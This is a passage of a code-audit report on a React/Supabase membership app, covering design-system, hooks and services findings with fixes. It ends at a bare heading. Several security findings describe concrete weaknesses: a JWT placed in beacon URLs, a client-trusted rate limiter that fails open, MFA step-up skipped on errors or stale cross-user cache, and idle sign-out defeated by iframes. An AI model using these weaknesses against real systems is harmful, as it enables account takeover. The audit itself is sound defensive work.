
### [Medium] Dark-mode secondary text equals primary text (visual hierarchy collapses)  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/theme/tokens.ts:79-80 (DARK.textPrimary and textSecondary both hsl(0,0,100)); wired at createAppTheme.ts:24 (text.secondary = t.textSecondary)
- **What breaks:** text.secondary is meant to be muted/de-emphasized ink, but in dark mode it equals text.primary (pure white). Every DS component rendering captions, helper text, disabled-ish labels, or CardDescription via text.secondary shows full-strength white in dark mode — 'muted' copy screams as loud as headings. Light mode has a real 36% grey (LIGHT.textSecondary hsl(0,0,36)), so the two modes behave inconsistently. This faithfully mirrors index.css --muted-foreground dark 0 0% 100% (line 244), so the defect is inherited, not introduced — but the DS reproduces it.
- **Smallest fix:** Give DARK.textSecondary a genuinely lower-emphasis value (e.g. hsl(0,0,70)); fix the matching --muted-foreground in index.css too so the mirror stays consistent.

### [Medium] Entire MUI catalog re-exported via `export *` from the main barrel, used or not  `over-engineering` (CONFIRMED)
- **Where:** src/design-system/index.ts:183-231 (~35 `export * from ...`, comment 'whether the app uses it today or not' at :185), rationale contradicted by src/design-system/keep-lib.ts:5-11
- **What breaks:** The barrel eagerly `export *`s every remaining MUI component. keep-lib.ts explicitly warns that barrel `export *` 'bloats the app graph and breaks/slows tests of unrelated components' — the exact reason the heavy libs were moved to a subpath — yet index.ts does that for the whole MUI surface. Star re-exports are the classic tree-shaking hazard, inflate the module graph for every `import { Button } from "@/design-system"`, and create silent ambiguous-binding collisions if any two starred modules export the same name (that name becomes unimportable with no error at the export site). Premature generalization: shipping/maintaining components no feature consumes.
- **Smallest fix:** Export only components the app uses, as explicit named `export { X } from` so collisions become compile errors; add catalog components on demand.

### [Medium] Dark-mode link and info text color fails WCAG AA contrast  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/theme/tokens.ts:82 (DARK.primary.main hsl(217,73,48)); consumed by MuiLink (components.ts:244), Button 'link' variant (components.ts:144), and palette.info.main (createAppTheme.ts:22) over background hsl(229,93,6)
- **What breaks:** DS link text, the Button link variant, and info-colored text all use primary.main hsl(217,73,48) (~#1f66cd). On the dark background hsl(229,93,6) (~#01061e) that is only ~3.6:1 contrast — below WCAG AA 4.5:1 for normal text. index.css explicitly avoided this by lifting its dark link token --primary-text to 72% lightness for '>=7:1 text' (index.css:232-233); the DS ignored that and used the 48% surface blue for text, so every DS link/inline info string in dark mode is a genuine accessibility failure, not just a cosmetic drift.
- **Smallest fix:** Use a dedicated dark link/text token at ~72% lightness (mirroring --primary-text) for MuiLink, the Button link variant, and any text-on-dark info usage; add a contrast test asserting link text >=4.5:1 against background per mode.
- _added-in-verification_

### [Low] Three Button variants are byte-identical duplicated style blocks  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/theme/components.ts:100-107 (outline), 108-116 (secondary), 117-125 (hero-outline)
- **What breaks:** outline, secondary, and hero-outline have exactly the same style object (secondaryBg/secondaryFg + 1px secondaryBorder + secondaryBgHover). A change to the outlined look must be made in three places or the variants silently diverge, and three names for one appearance mislead consumers into thinking they differ. Classic duplicate-block drift trap.
- **Smallest fix:** Extract one `outlinedStyle` const and reference it from all three variant entries (or collapse to one variant if the distinction is not real).

### [Low] DS unit test imports across the src->docs boundary  `dependency` (CONFIRMED)
- **Where:** src/design-system/components/__tests__/docs-demos.test.tsx:11 (import { registry } from "../../../../docs/design/design-system/.vitepress/demos/registry")
- **What breaks:** A src unit test reaches four levels up into docs/.vitepress tooling and asserts >70 demos mount (line 28). The DS test run now depends on the docs island registry existing and compiling; moving/renaming the docs folder, or excluding docs from the test tsconfig, breaks DS tests unrelated to docs. It also drags all ~70+ demo modules and their imports into the unit-test graph, slowing the suite. Couples two layers that should be independent.
- **Smallest fix:** Move this demo-smoke test into the docs test project, or expose demos through a stable DS-owned entrypoint instead of a deep relative docs path.

### [Low] Typography px annotations do not match the actual clamp sizes  `other` (CONFIRMED)
- **Where:** src/design-system/theme/typography.ts:23-25 (h1 '(64)' but clamp max 3rem/48px; h2 '(48)' but 2.25rem/36px; h3 '(36)' but 1.75rem/28px)
- **What breaks:** The inline scale annotations claim 64/48/36 px maxima but the clamp() maxima are 48/36/28. A maintainer trusting the comments to reproduce the 'Tech Fleet type scale' mis-sizes headings, and a reviewer can't tell whether the numbers or the code are authoritative. Documentation drift inside the token file itself.
- **Smallest fix:** Correct the px annotations to the real clamp maxima (or fix the clamps if 64/48/36 is the intended spec).

### [Low] DesignSystemProvider hard-throws when no ThemeProvider ancestor (no fallback)  `error-handling` (CONFIRMED)
- **Where:** src/design-system/provider/DesignSystemProvider.tsx:36 (useAppTheme) -> src/components/ThemeProvider.tsx:63 (throw new Error)
- **What breaks:** The base provider everything renders through calls useAppTheme(), which throws 'useTheme must be used within ThemeProvider' when no app ThemeProvider ancestor exists (a Storybook story, an isolated test, a new island that forgets the wrapper). Nothing recovers, retries, or reports a friendlier failure — one missing wrapper crashes the whole subtree into a blank page.
- **Smallest fix:** Accept mode as a prop with a sane default (per finding 3), or fall back to a default light theme and console.warn when no theme context is present instead of throwing.

### [Low] MUI mode is read from React state while Tailwind dark reads a class set in useEffect (theme flash)  `boundary` (CONFIRMED)
- **Where:** src/design-system/provider/DesignSystemProvider.tsx:36-37 (createAppTheme(resolvedTheme) during render) vs src/components/ThemeProvider.tsx:35-40 (root.classList set in useEffect)
- **What breaks:** MUI DS components pick up the mode synchronously from React state (createAppTheme runs during render), but Tailwind/index.css dark styling depends on the .dark class applied to <html> only after paint in a useEffect. On first render/hydration, or if the effect is delayed, DS components can render dark while Tailwind components render light (or vice-versa) on the same screen — a flash of mismatched theme. One fact applied through two channels with different timing.
- **Smallest fix:** Apply the html class before first paint (inline boot script / set during render) so the class and the MUI mode flip as one atomic switch.

### [Low] Button augmentation adds TF variants without disabling MUI's native contained/text/outlined  `over-engineering` (CONFIRMED)
- **Where:** src/design-system/theme/augmentation.d.ts:8-21
- **What breaks:** The augmentation adds 9 TF variants but never sets MUI's native contained/text/outlined to false in ButtonPropsVariantOverrides. `<Button variant="contained">` still type-checks and renders MUI's default (blue, elevated) blended with the DS root overrides (asym radius, no ripple) — a half-branded, off-spec button that passes CI. Consumers can silently escape the sanctioned variant set.
- **Smallest fix:** Set contained/text/outlined (and any other non-TF built-ins) to false in ButtonPropsVariantOverrides so only sanctioned variants type-check.

### [Low] Hero button dark-mode hover flips off-white to mid-blue with low-contrast dark label  `under-engineering` (PLAUSIBLE)
- **Where:** src/design-system/theme/components.ts:72-80 (hero variant) with tokens.ts:88-90 (DARK.btn.primaryBg #f4f6ff, primaryFg rgb(51,51,51))
- **What breaks:** In dark mode the hero button base is off-white (#f4f6ff) with dark text rgb(51,51,51), but its hover hardcodes backgroundColor #4d8cff (components.ts:78). On hover the surface jumps off-white -> mid-blue while the label stays dark #333: dark #333 on #4d8cff is roughly 3:1, borderline for AA text, and the abrupt light->blue swap on the same control reads as a rendering glitch. The magic #4d8cff (also flagged in finding 8) is unthemed, so this is invisible to any contrast/token check.
- **Smallest fix:** Drive the hero hover from a token whose contrast against the current-mode primaryFg is validated, or keep the hover within the same lightness family as the base; add it to the contrast test suite.
- _added-in-verification_

---

## Hooks

### [High] JWT access token written into the URL query string for the sendBeacon draft flush  `security` (CONFIRMED)
- **Where:** src/hooks/use-server-draft.ts:243-247
- **What breaks:** beaconFlush appends the raw Supabase access_token to the URL: navigator.sendBeacon(`${url}?token=${encodeURIComponent(session.access_token)}`, blob). Full request URLs land in Cloudflare/Supabase edge logs, any proxy, browser history, and Referer headers. A still-valid JWT captured there = full session hijack of that member. It fires on every visibilitychange:hidden, pagehide, and pre-HMR event while a draft is dirty (lines 264-266), so it is routine across all users, not an edge case. The inline comment (241-242) admits the design.
- **Smallest fix:** Never put the token in the URL. Have save-form-draft read the token from the POST body and send it as a body field in the Blob; or drop the beacon path and use the keepalive fetch branch (which already sends Authorization as a header).

### [High] Realtime channel leak: teardown is returned from an async IIFE, never registered as effect cleanup  `error-handling` (CONFIRMED)
- **Where:** src/hooks/useUgcTranslation.ts:103-127
- **What breaks:** The channel is subscribed inside `(async () => {...})()`. Its `return () => supabase.removeChannel(channel)` (line 124) is the return value of that inner async function (a discarded Promise), NOT the useEffect cleanup. The effect's real cleanup (line 127) only sets cancelled=true. The channel is removed only inside the broadcast handler when a matching translation arrives (line 117). If the worker is down/slow or the component unmounts first, the channel is never removed. Every non-English UGC field that fails to resolve leaks one Realtime channel; at scale this walks into the Realtime channel/connection quota and drops subscriptions app-wide.
- **Smallest fix:** Hoist the channel to effect scope (or a ref) and call supabase.removeChannel(channel) unconditionally in the real useEffect cleanup.

### [High] Idempotency hook mints a fresh request id per call, defeating server-side dedup  `other` (CONFIRMED)
- **Where:** src/hooks/useIdempotentMutation.ts:24-29,38,56-57
- **What breaks:** genRequestId() appends fresh crypto random bytes every invocation (line 27), so the SAME logical action yields a DIFFERENT X-Request-Id on every React Query retry and on any re-click after the in-flight slot releases (the setTimeout delete at line 68). The server's withIdempotency keys on X-Request-Id, so it can never recognize the retry as a duplicate — the exact double-submit case this hook exists to stop executes twice server-side (double role grant, double application). Separately, lastRequestId is one shared ref across all keys (line 38,57), so two concurrent actions clobber each other's id and getRequestId() can return the wrong one.
- **Smallest fix:** Derive the request id deterministically from the idempotency key (stable hash of seed[+variables]) so retries reuse it; store the id per-key in the inFlight map instead of one shared ref.

### [High] General application row has three uncoordinated last-write-wins writers plus a duplicate-record create race  `ownership` (CONFIRMED)
- **Where:** src/hooks/use-general-application.tsx:108-128,207-292,300-319
- **What breaks:** handleSave, handleNext, AND the 30s useAutosave onSave all write overlapping gatherSaveFields() to the same application row with no coordination. Autosave and handleNext write current_section and the whole form; a late autosave carrying a stale section silently reverts the user's progress. Worse, loadOrCreateApp sets initialLoadDone.current=true only AFTER the awaited list() (line 122); under StrictMode double-invoke or a fast remount, both runs see length 0 and both call GeneralApplicationService.create() -> two general applications for one user, despite useIdempotentMutation existing in the codebase.
- **Smallest fix:** Serialize writes through one owner (a single flush/save queue) and guard creation with an in-flight ref set BEFORE the await (or an idempotency key) so create() runs once.

### [High] Idle auto-signout is defeated by any focused iframe or any playing media; catch fails toward signout  `security` (CONFIRMED)
- **Where:** src/hooks/use-idle-timeout.ts:81-101
- **What breaks:** isMediaActive() returns true if document.activeElement is ANY iframe (line 84) or ANY <video>/<audio> is playing (85-87), and the 30s poll then resets the 30-min idle-signout timers. One focused embedded iframe (lesson embed, chat widget, ad) or one looping/autoplaying media element keeps the session alive indefinitely — on a shared/public machine the user is never signed out. The comment claims the catch 'fails open (don't sign out aggressively)' but it returns false (=NOT active), so an exception actually fails TOWARD signout, the opposite of the stated intent.
- **Smallest fix:** Restrict the heuristic to an allow-list of known lesson-player iframes and to media the user actually started, and enforce a hard maximum session cap the heuristic cannot extend.

### [Medium] Autosave classifies transient serialization/deadlock errors (40001/40P01) as fatal schema_drift, permanently opening the circuit  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-autosave.ts:79,85-87,174-177
- **What breaks:** classifyError maps any code matching /^4\d/ (line 79) to 'schema_drift', which isFatalReason() treats as non-retryable -> openCircuit() fires immediately and the 30s ticker stops for good (manual retry only). Postgres 40001 (serialization_failure) and 40P01 (deadlock_detected) both start with '40' and are transient, retryable contention errors — exactly what happens under concurrency at scale. An ordinary write conflict permanently opens the autosave circuit and the user's later edits are silently never saved until they notice and click retry.
- **Smallest fix:** Match specific PG/PostgREST codes; classify 40001/40P01 (and other contention codes) as transient/retryable rather than schema_drift, and stop keying fatality off a broad /^4\d/ regex.

### [Medium] Server-draft re-fires reportError every 30s after backoffs exhaust (no circuit, no reported-once guard)  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-server-draft.ts:199-209,216-220
- **What breaks:** When failureCountRef reaches BACKOFFS.length flush sets status='error' and calls reportError (201-203), but unlike use-autosave there is no circuit and no circuitReportedRef guard, and the fixed 30s ticker (218) keeps calling flush(). failureCountRef is only reset on success, so each tick re-enters the exhausted branch and fires reportError again -> a warn audit row every 30s for as long as the form stays mounted with a failing save. This is precisely the repeated-audit-row bug use-autosave fixed with circuitReportedRef; server-draft never got the fix.
- **Smallest fix:** Mirror use-autosave: add a circuit-open flag + reported-once guard, and stop the ticker calling flush() once in the terminal error state.

### [Medium] sendBeacon return value ignored; draft marked saved even when the beacon was dropped  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-server-draft.ts:243-247
- **What breaks:** navigator.sendBeacon returns false when the browser refuses to queue (payload too large, queue full), but the code advances lastSavedValueRef.current = current unconditionally (246) and returns. The draft is then treated as durably saved when it never left the browser. On the next mount the user silently loses the edits made just before the tab hid — the exact loss server-side drafting exists to prevent.
- **Smallest fix:** Capture the boolean sendBeacon returns; only advance lastSavedValueRef on true, and on false fall through to the keepalive fetch (or leave the value dirty).

### [Medium] Unread notification count derived from a list capped at 50; realtime ignores UPDATE/DELETE  `other` (CONFIRMED)
- **Where:** src/hooks/use-notifications.ts:25-49,110-134
- **What breaks:** useUnreadNotificationCount filters the array from useNotifications(), which defaults to limit 50 (line 25) and mixes read+unread in that page. A user with >50 unread sees a badge that saturates below the true count — a persistent undercount for active members. The realtime subscription only handles INSERT (event:'INSERT', 116); a notification marked read or deleted on another device never invalidates this cache, so the bell drifts across devices until the next 60s poll.
- **Smallest fix:** Get the unread count from a dedicated count query/RPC, not a truncated list; subscribe to UPDATE/DELETE (or event:'*') and invalidate on any change.

### [Medium] Grid-state save and reset swallow every failure with no report and no UI feedback  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-grid-state.ts:57-59,76-78
- **What breaks:** persistState's upsert catch (57-59) and clearState's delete catch (76-78) are empty — no reportError, no state, no UI signal. An admin rearranges/filters a grid and the save silently fails (RLS, offline, schema) so the layout is lost on reload with no indication; 'reset' can silently no-op while the UI shows it cleared. Neither catch recovers, retries, nor reports — it hides the failure. (The load catch at 36-38 falling back to defaults is defensible.)
- **Smallest fix:** reportError (severity warn) on the save and delete catches and surface a non-blocking failure state; at minimum log so the failures are observable.

### [Medium] Membership realtime can drop the first tier change after mount (no refreshProfile, no toast)  `other` (PLAUSIBLE)
- **Where:** src/hooks/use-membership-realtime.ts:54-68,167-205
- **What breaks:** The transition detector guards on prevTier !== null (174-176). The seeding effect only seeds refs when profile is present (55), while the realtime subscription is deferred via useDeferredMount and can go live independently. If the first UPDATE arrives while the refs are still null, tierChanged/foundingFlipped/billingChanged are all false, so the FIRST membership upgrade is dropped — no toast and, critically, no refreshProfile() (204 sits inside the guarded block). A paid upgrade landing as the page loads leaves a paying member appearing to lack access until a manual reload.
- **Smallest fix:** Drive the comparison from the authoritative fetched profile snapshot rather than lazily-seeded refs, or call refreshProfile() on ANY UPDATE and compute the toast from the before/after values.

### [Medium] Client fires gumroad-reconcile on every fresh tab/reload (in-memory guard only) — client-timed financial reconciliation  `ownership` (CONFIRMED)
- **Where:** src/hooks/use-membership-realtime.ts:75-116
- **What breaks:** Membership tier is authoritatively written server-side (webhooks/triggers/nightly sweep), yet this hook has the client initiate reconciliation. Backfill is guarded by a sessionStorage flag (106-123), but reconcile is guarded only by the in-memory reconciledRef (44,76-77), which resets on every new tab and hard reload. So every tab a user opens fires another gumroad-reconcile edge call — a client timing a financial reconciliation, multiplied by tabs and reloads across all users.
- **Smallest fix:** Guard reconcile with the same per-session storage flag as backfill (or move it server-side / to a single app-boot trigger) so it runs at most once per session per user.

### [Medium] General application form is a second writer of profile fields owned by profile settings  `ownership` (CONFIRMED)
- **Where:** src/hooks/use-general-application.tsx:187-205,300-319
- **What breaks:** syncProfileFields writes country, timezone, experience_areas, professional_goals, notify_* flags, education_background, interests, scheduling_url through ProfileService on every save/next/autosave. These are also owned/edited by the profile settings surface. The form snapshots them at mount (populateFormFromApp, 68-94) and re-writes the whole snapshot up to every 30s via autosave. If the user changes their timezone/notification prefs in settings in another tab while this draft autosaves the stale snapshot, the form clobbers the newer value — two editing surfaces of one fact.
- **Smallest fix:** Write only profile fields the form actually changed (dirty-field diff), or drop profile mirroring here and read those fields through the owning service instead of re-writing them.

### [Medium] Milestone reference: inner 1h MemoryCache outlives React Query's 30m staleTime and can't be invalidated  `ownership` (CONFIRMED)
- **Where:** src/hooks/use-milestone-reference.ts:13-38
- **What breaks:** queryFn checks MemoryCache (1h TTL, line 14/25) and returns it before touching the DB, nested inside a React Query with CACHE_STATIC (30-min staleTime). Because the inner TTL is longer, React Query staleness and even an explicit invalidateQueries are defeated: a refetch re-runs queryFn, which returns the still-warm MemoryCache value. An admin editing milestone_reference sees no change for up to an hour with no client-side way to bust it — two cache layers, the un-bustable one authoritative.
- **Smallest fix:** Drop the redundant MemoryCache layer (React Query already caches), or clear the MemoryCache key on invalidate; at minimum set its TTL <= staleTime.

### [Medium] UGC translation: unchecked job insert leaves a permanent spinner and floods the job table with duplicates  `error-handling` (CONFIRMED)
- **Where:** src/hooks/useUgcTranslation.ts:67-95
- **What breaks:** The cache lookup destructures only `data` (67), discarding the error. The job insert (86-95) has no error check: if it fails, isTranslating stays true forever (a spinner that never resolves) with no report. There is also no dedup — every cache miss inserts a new priority:'realtime' job, so N users viewing the same localized field enqueue N identical jobs and every remount/locale flip enqueues more. At scale ugc_translation_jobs and the worker are flooded with duplicate high-priority work.
- **Smallest fix:** Check the insert error and clear/surface the translating state on failure; upsert on (entity_table, entity_id, column_name, target_locale, source_hash) so duplicate jobs coalesce.

### [Medium] Fleety chat persists with unchecked inserts and an uncaught save inside the streamChat onDone callback  `error-handling` (CONFIRMED)
- **Where:** src/hooks/useFleetyChat.ts:48-54,150-156
- **What breaks:** saveMessage awaits a chat_messages insert and a chat_conversations update with no error handling (48-54); createConversation returns null on error with no report (42). A failed message insert silently loses the persisted turn while the UI still shows it, breaking the advertised cross-mode continuity with no signal. onDone (150-156) does `await saveMessage(...)` and `await loadConversations()` with no try/catch inside the streamChat callback, so a rejected save becomes an unhandled promise rejection rather than a handled error.
- **Smallest fix:** Wrap saveMessage/createConversation in try/catch with reportError; wrap the onDone body in try/catch and surface a 'not saved' state.

### [Medium] Admin grid state serializes free-text search (member PII) into the URL and browser history  `security` (CONFIRMED)
- **Where:** src/hooks/use-synced-table-state.ts:104-119
- **What breaks:** flushWrite serializes every non-default state key into the URL via history.replaceState (108-119). On admin grids (Activity Log, etc.) that state bag includes free-text search boxes, whose content is frequently a member's email/name or other PII. That PII is then persisted in browser history, exposed in any shared/copied link, and leaks via Referer on outbound navigation. On a shared admin machine it becomes a durable PII trail.
- **Smallest fix:** Keep free-text/search fields in sessionStorage only (never the URL), or omit/hash sensitive keys from the query string; limit URL sync to non-sensitive pagination/sort state.

### [Medium] Discord role-retry drain is not multi-tab safe — no row claim or idempotency key, risking double role grants  `other` (CONFIRMED)
- **Where:** src/hooks/use-discord-role-retry.ts:17,25-55
- **What breaks:** triedRef is per-mount/in-memory (17). Two tabs (or a tab reopened after refresh) both run drain() on login, both fetch the same list_pending_role_grants_for_user rows, and both loop invoking manage-discord-roles 'assign' and mark_discord_role_grant_result for the same grant id with no lock, claim, or idempotency key (despite useIdempotentMutation existing). Depending on server idempotency this yields duplicate Discord role-assign calls and racing mark-result writes on the same queue row.
- **Smallest fix:** Claim rows server-side (SELECT ... FOR UPDATE SKIP LOCKED, or a status='processing' transition) before invoking, and/or send an idempotency key per grant id.

### [Medium] Explore sends client-mutable user_metadata to Discord via an uncaught fire-and-forget call  `security` (CONFIRMED)
- **Where:** src/hooks/use-explore.ts:127-130,132-141
- **What breaks:** displayName is read from (user as any).user_metadata.full_name (128) — a field the user can set to arbitrary text — and passed straight into DiscordNotifyService.resourceExplored, which posts to an internal Discord channel. Trusting client-mutable metadata for outbound messaging invites content injection/spoofing. The notify call is fire-and-forget with no .catch (unlike refreshPopular at 95), so a rejection is unhandled. (Correction to first pass: reportError at line 140 passing user?.id as the third arg is NOT mis-shaped — the signature accepts `ReportOptions | string`, so that sub-claim is dropped; the metadata-trust and missing-.catch issues stand.)
- **Smallest fix:** Derive the display name from a server-trusted profile field, not user_metadata, and add .catch(reportError) to the notify call.

### [Medium] Admin/teacher authorization served from a stale 2-minute client cache with no wired invalidation  `security` (PLAUSIBLE)
- **Where:** src/hooks/use-admin.ts:28-36; src/hooks/use-teacher.ts:23-29
- **What breaks:** Both role checks use staleTime 2m, gcTime 10m, refetchOnMount:false, refetchOnWindowFocus:false. The comment claims role changes propagate 'via auth state change -> cache invalidation,' but nothing in these files wires that, and refetchOnMount:false means navigation won't refresh it. When an admin/teacher is demoted, the client keeps reporting isAdmin/isTeacher true for up to the cache window. If any privileged action is gated only by this flag rather than enforced server-side by RLS/RPC, that is a multi-minute privilege-retention window; even for pure UI gating it exposes admin-only surfaces (e.g. the system_health widget) to a just-revoked user.
- **Smallest fix:** Ensure every privileged action is enforced server-side by RLS/RPC regardless of this flag; actually wire invalidation of these role queries on auth state change and lower the trust window for privileged surfaces.

### [Medium] System-health realtime subscribe has no status handler; the admin dashboard silently freezes on drop  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-system-health-realtime.ts:22-44
- **What breaks:** .subscribe() is called with no status callback (39). If the channel errors or drops (CHANNEL_ERROR, TIMED_OUT, mobile background) the hook silently stops receiving changes. It is explicitly presented as the replacement for per-minute polling ('instead of every admin tab fetching every minute'), so there is no polling fallback — the System Health dashboard quietly freezes on stale data with no reconnect and no report, exactly where staleness matters most (operational health).
- **Smallest fix:** Pass a status callback to .subscribe(); on error/timeout report and either resubscribe with backoff or fall back to a low-frequency poll so the dashboard cannot silently freeze.

### [Medium] Discord role-retry: the manage-discord-roles edge invoke is NOT timeout-wrapped, contradicting the hook's own comment  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-discord-role-retry.ts:9-14,36-39
- **What breaks:** The header comment claims 'All RPCs use rpcWithTimeout (8s) so a wedged PostgREST stream cannot pin this hook open indefinitely.' But only the two mark_discord_role_grant_result RPCs and the list RPC are wrapped; the actual supabase.functions.invoke('manage-discord-roles') at 36-39 has no timeout. A hung/slow edge function blocks the sequential for-loop (33-54) indefinitely, stalling all remaining queued grants for that user — the exact wedge the comment promises is prevented. added-in-verification.
- **Smallest fix:** Wrap the manage-discord-roles invoke in the same 8s timeout guard (or Promise.race with an AbortController), and make the comment accurate.

### [Medium] UGC cache lookup uses .maybeSingle() over an .in(status,[qa_passed,approved]) filter that can match multiple rows  `error-handling` (PLAUSIBLE)
- **Where:** src/hooks/useUgcTranslation.ts:67-82
- **What breaks:** The cache query filters status .in(['qa_passed','approved']) and then calls .maybeSingle() (67-76). If the same entity/column/locale/source_hash has both a qa_passed and an approved row, maybeSingle returns an error instead of a row. That error is discarded (only `data` is destructured, 67), so `data?.translated_text` is falsy and the code falls through to enqueue a fresh realtime job every render — a warm, already-translated field permanently shows the spinner and re-floods the job table. added-in-verification.
- **Smallest fix:** Use .limit(1).maybeSingle() with a deterministic order (e.g. prefer approved), or select the single canonical status; and check/report the lookup error instead of discarding it.

### [Medium] General application profile sync swallows write failures — the user's entered profile data silently diverges  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-general-application.tsx:187-205
- **What breaks:** syncProfileFields wraps ProfileService.updateFields + refreshProfile in try/catch with an empty body marked 'Non-blocking' (202-204). A failed profile write (RLS, offline, validation) is neither recovered, retried, nor reported: the form thinks it saved country/timezone/notification prefs/etc., the profile row never changes, and there is no signal to the user or telemetry. Under the autosave path (312-317) this repeats every 30s, silently. added-in-verification.
- **Smallest fix:** reportError (severity warn) in the catch so the divergence is observable, and surface a non-blocking 'profile changes not saved' state; do not treat a persistence failure as a no-op.

### [Low] Dead mergeHydration helper plus unstable `defaults` deps churn the visibilitychange listener every render  `over-engineering` (CONFIRMED)
- **Where:** src/hooks/use-synced-table-state.ts:67-69,123,132,143,149-163,220
- **What breaks:** mergeHydration is defined (67-69), never used, then silenced with `void mergeHydration` (220) and kept 'as a doc example' — dead code the repo rules say to delete. Separately flushWrite/scheduleWrite/setState list `defaults` in their dep arrays (123,132,143); callers pass a fresh inline defaults object each render, so these callbacks are recreated every render and the visibilitychange effect (149-163) tears down and re-adds its listener on every parent render — needless churn and a subtly unstable public setState identity.
- **Smallest fix:** Delete mergeHydration; capture defaults once via a ref (or require a memoized defaults) so the callbacks and the listener effect are stable.

### [Low] Dashboard-preferences has identical-arm ternaries/IIFEs and re-runs the queryFn's normalization  `over-engineering` (CONFIRMED)
- **Where:** src/hooks/use-dashboard-preferences.ts:117-127
- **What breaks:** The visibleWidgets IIFE (118-122) returns the same expression in both branches, and widgetOrder uses `Array.isArray(raw) ? extractWidgetList(raw) : extractWidgetList(raw)` (125) — a ternary whose arms are identical. This 'self-healing' block re-runs the exact normalization the queryFn already did (74-85), duplicating the source of truth and misleading maintainers into thinking the branches differ.
- **Smallest fix:** Delete the redundant ternaries/IIFEs and rely on the queryFn's already-normalized Prefs; keep one normalization path.

### [Low] Two parallel toast systems in use across hooks, with dead sonner imports  `over-engineering` (CONFIRMED)
- **Where:** src/hooks/use-toast.ts; src/hooks/use-explore.ts:15; src/hooks/use-notifications.ts:16; src/hooks/use-quest.ts:4; src/hooks/use-general-application.tsx:16; src/hooks/use-membership-realtime.ts:21
- **What breaks:** The shadcn reducer-based useToast/toast (use-toast.ts) coexists with sonner's toast (use-quest, use-membership-realtime, use-general-application), while use-explore imports the shadcn toast — two mechanisms for one concern means inconsistent styling/behavior, double maintenance, and ambiguity over which to call. use-notifications.ts:16 imports sonner's toast but never calls it (verified — dead import).
- **Smallest fix:** Pick one toast system, migrate call sites, delete the other and the unused imports.

### [Low] Four hooks bypass the @/lib/react-query wrapper and import TanStack directly  `dependency` (CONFIRMED)
- **Where:** src/hooks/usePolicy.ts:1; src/hooks/use-framework.ts:3; src/hooks/use-reference.ts:3; src/hooks/useCommunityEventsWeek.ts:1
- **What breaks:** Nearly all hooks import useQuery/useMutation from '@/lib/react-query' (the app wrapper centralizing defaults/persistence/error handling). These four import straight from '@tanstack/react-query' (verified via grep), silently opting out of whatever the wrapper standardizes, so behavior (persistence, retry/error defaults) diverges per hook invisibly at the call site and drifts further over time.
- **Smallest fix:** Import from '@/lib/react-query' consistently and add a lint rule banning direct '@tanstack/react-query' imports outside the wrapper.

### [Low] useCommunityEventsWeek hand-rolls the edge-function call and silently downgrades to the anon key  `over-engineering` (CONFIRMED)
- **Where:** src/hooks/useCommunityEventsWeek.ts:8-25
- **What breaks:** The hook builds FUNCTIONS_URL from VITE_SUPABASE_PROJECT_ID (8) and issues a raw fetch with hand-assembled apikey/Authorization headers (15-21), duplicating what supabase.functions.invoke already does — a second backend path that must be kept in sync with client config. It also falls back to the anon key as the bearer token when no session exists (14) rather than surfacing the unauthenticated state.
- **Smallest fix:** Call supabase.functions.invoke('get-community-events', ...) (or a service wrapper) so auth, base URL, and keys come from the single client.

---

## Services

### [High] Rate limiter is client-trusted (peek/record split) and fails open on every error path  `security` (CONFIRMED)
- **Where:** src/services/rate-limit.service.ts:46-89 (callRpc peek/record_failure modes), 66-78, 94-101, 134-138 (fail-open returns)
- **What breaks:** Login is documented (line 90) to prefer peek()+recordFailure(); peek() only reads and never increments, and recordFailure() is a separate browser-initiated call. A credential-stuffing client simply never calls recordFailure, so the 6-attempts/15-min counter never advances and the lockout is inert — nothing server-side forces the increment per attempt. On top of that EVERY structural failure (RPC error line 70, unexpected throw line 76, identifier>255 line 49/94, unknown action line 52/98) returns {allowed:true} — so a DB blip, or a deliberately over-long/malformed identifier, disables throttling outright. The build-time pepper is admitted in-file to be non-secret and does not help. The atomic legacy check() exists but the login path deliberately routes around it.
- **Smallest fix:** Enforce inside one SECURITY DEFINER RPC that checks AND records atomically, keyed to the real server-side auth attempt; stop blanket fail-open for login_attempt (fail-closed or captcha-challenge on structural errors).

### [High] MFA gate fails OPEN (skips step-up) when listFactors throws — mislabeled 'failing closed'  `security` (CONFIRMED)
- **Where:** src/services/mfa.service.ts:160-168 (getMfaGateDecision catch), 334-349 (markCurrentSessionVerified swallow)
- **What breaks:** On listFactors() failure the catch returns { hasVerifiedTotp:false, needsChallenge:false } and calls it 'failing closed' — but needsChallenge=false means NO second-factor prompt. A user who has a verified TOTP factor but whose session is AAL1 is waved through whenever listFactors flakes (network blip, GoTrue Web-Lock steal, PGRST002 schema reload — all conditions the codebase explicitly expects and retries elsewhere). A transient error becomes a step-up bypass for that request window. Separately markCurrentSessionVerified swallows a failed mark_two_factor_login_verified RPC with only log.warn: the local session is AAL2 while the DB flag RLS/features key on is never set — silent divergence, never reported to triage.
- **Smallest fix:** On listFactors failure treat state as unknown and BLOCK/re-poll (require re-auth) rather than clearing needsChallenge; route the mark_two_factor_login_verified failure through reportError.

### [High] MFA listFactors cache is a module global never invalidated on sign-out — stale cross-user factor decision  `security` (PLAUSIBLE)
- **Where:** src/services/mfa.service.ts:44-46,63-81 (factorCache, 60s TTL) vs src/contexts/AuthContext.tsx:202-208 (SIGNED_OUT handler)
- **What breaks:** factorCache is a per-tab module-level singleton with a 60s TTL, invalidated ONLY on enroll/unenroll/verifyEnrollment (lines 102,129,140). The SIGNED_OUT handler clears local auth state and the React Query cache but never calls invalidateFactorCache(). In an SPA session where user A signs out and user B signs in on the same tab within 60s, getMfaGateDecision()/listFactors() returns user A's cached factors for user B. If A had no verified TOTP, hasVerifiedTotp=false is served for B, so needsChallenge=false and B (who DOES have a factor) is waved past step-up — an MFA bypass keyed purely on stale cache. The inverse locks B out with a challenge for a factor B doesn't own. Shared/kiosk devices make same-tab fast user switches routine.
- **Smallest fix:** Invalidate the factor cache on every auth state change (SIGNED_OUT/SIGNED_IN/USER_UPDATED), or key the cache by user id so a different user can never read the previous user's factors.
- _added-in-verification_

### [High] Dead error reporting: inner best-effort helpers swallow, so caller .catch(reportError) is unreachable  `error-handling` (CONFIRMED)
